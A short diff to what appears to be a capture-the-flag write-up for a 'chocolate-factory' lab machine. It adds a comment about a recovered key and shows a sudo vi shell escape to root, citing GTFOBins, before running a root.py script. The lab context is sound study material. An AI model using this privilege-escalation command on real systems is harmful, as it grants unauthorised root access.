@@ -102,6 +102,8 @@ https://gtfobins.github.io/gtfobins/vi/
 charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
 #ls /root
 root.py
+
+#By using our obtained key from the binary “key_rev_key” we can run the python script enter the desired key.
 python root.py
 Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 
